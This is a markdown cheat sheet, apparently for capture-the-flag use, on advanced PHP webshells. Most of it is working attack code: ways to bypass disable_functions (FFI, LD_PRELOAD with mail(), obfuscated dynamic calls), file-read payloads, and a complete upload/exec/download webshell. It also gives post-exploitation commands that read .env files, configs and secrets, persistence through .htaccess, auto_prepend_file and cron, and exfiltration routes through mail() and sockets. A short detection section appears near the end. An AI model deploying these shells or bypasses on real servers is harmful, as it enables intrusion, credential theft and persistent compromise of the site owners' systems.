# Webshell Advanced — beyond `system($_GET['c'])`

## The capability ladder — what the shell needs to do

```
prove exec      → phpinfo()/echo marker            — the smallest possible
read files      → cat/file_get_contents             — flag reads
write files     → file_put_contents/fwrite          — persistence/overwrite
exec commands   → system/shell_exec/passthru/exec/proc_open
eval code       → eval/assert/create_function       — arbitrary PHP
db access       → PDO/mysqli with discovered creds  — data flags
```

Start with the smallest payload that proves the point — `<?php phpinfo()?>`
or `<?php echo 6*7 ?>` — then escalate.

## PHP exec functions — the full set and their profiles

```php
system($c)          → output echo'd directly
shell_exec($c)      → output captured — echo it
exec($c, $o)        → output into array
passthru($c)        → raw binary output — download paths
proc_open           → pipes — control
popen($c, 'r')      → stream
`$c`                → backtick operator = shell_exec
pcntl_exec          → process replace — rare
```

disable_functions may block `system`+`exec` but miss `proc_open`/`popen`/
backticks/`mail`/`putenv`+`mail`-ish chains, `imap_open`, `LD_PRELOAD`
tricks, `ffi` (PHP 7.4+ FFI — `FFI::cdef` calling libc directly).

## disable_functions bypass — the common CTF task

```php
// check first:
<?php var_dump(ini_get('disable_functions')); ?>

// the known alternatives:
$_GET['f']($_GET['x']);           // dynamic call — often works if 'call' not banned
call_user_func($f, $x);
array_map($f, [$x]);
$a='sys'.'tem';$a($c);            // concat — static grep misses
forward_static_call, register_tick_function, register_shutdown_function
$ref = new ReflectionFunction('system'); $ref->invoke($c);
mb_* / iconv / preg_replace /e (legacy)
mail() with crafted args (sendmail_path injection)
Imagick delegates (if imagick ext loaded — image-attacks)
FFI: FFI::cdef("int system(char*);")->system("id");
putenv('LD_PRELOAD=/tmp/lib.so')+mail() — classic bypass needs a .so upload
```

The LD_PRELOAD trick — upload a `.so` + a mail()/new-process call that
inherits the env → the .so's constructor runs.

## File-read without exec — when only includes exist

```php
<?php echo file_get_contents('/flag'); ?>
<?php readfile('/flag'); ?>
<?php var_dump(scandir('/')); ?>
<?php foreach(glob('/*') as $f) echo "$f\n"; ?>
<?php echo file_get_contents($_GET['f']); ?>   // general read shell
<?php echo base64_encode(file_get_contents($_GET['f'])); ?>  // binary-safe
```

`glob`/`scandir`/`DirectoryIterator`/`SplFileObject`/`ZipArchive` —
filesystem access without exec calls.

## The "no `<?php` tag" constraint — include-shells

If the stored file is included (not exec'd directly) and the tag gets
stripped by a filter: `<?=` short-echo, `<?` short-open (if enabled),
`<script language="php">` (PHP<7 — legacy but appears in CTF).

## Post-exploitation moves — what to do with exec

```bash
id && hostname && pwd                       # context
cat /flag /flag.txt /app/flag* 2>/dev/null # flag hunt
find / -name '*flag*' -readable 2>/dev/null
env | grep -i flag|secret|key              # env flags
cat .env config/* settings* 2>/dev/null    # config flags
mysql -u... -e 'select flag from ...'      # DB flags (creds from config)
curl internal...                            # pivot to internal
```

CTF flag paths: `/flag`, `/flag.txt`, `/app/flag`, `/root/flag` (needs
privesc), `FLAG` env var, a DB table — check source first (`whitebox-hunt`).

## The non-exec alternatives — when no exec function works

- `include`/`file_get_contents` reads — flag reads suffice for most CTF
- `unlink`/`rmdir` — destructive DoS on the app
- `header()`/`setcookie` — response manipulation
- `mail()` — exfil via outbound mail
- `error_log($data, 3, '/tmp/x')` — file write
- `fsockopen`/`curl_*` — network egress for OOB exfil

## Interactive features — the fuller shell shape

```php
<?php
$c=$_GET['c'];
if($c) echo '<pre>'.shell_exec($c.' 2>&1').'</pre>';
if(isset($_FILES['u'])) move_uploaded_file($_FILES['u']['tmp_name'],$_FILES['u']['name']);
if(isset($_GET['d'])) readfile($_GET['d']);
if(isset($_GET['f'])) echo file_get_contents($_GET['f']);
?>
```

A 3-tool shell: `?c=` exec, `?d=` download, `?f=` read, `u` upload.

## Persistence — when the shell must survive

- `.htaccess`/`auto_prepend_file` — code runs on every request in dir
- inject into an existing frequently-loaded file (index.php prepend) —
  modifies app code — blast-radius warning
- cron via `.config/crontab`/`/var/spool/cron` writes
- a NEW route file the framework autoloads (`routes/*.php`,
  `app/Http/Controllers/XController.php`) — the file IS the persistence

## Webshell detection — what's logged

- access log entries on the shell URL
- upload endpoint POSTs
- process spawn from php-fpm worker (pstree)
- new files in the upload dir

CTF doesn't care about stealth usually — but minimize requests anyway.

## Falsifiers

- `disable_functions` covers the whole exec family AND no FFI/imagick/
  mail alternatives AND the flag needs exec not just read
- the file can never be reached by an interpreter

## Output to record

- the exec primitive that worked + verbatim output
- the flag read + its path
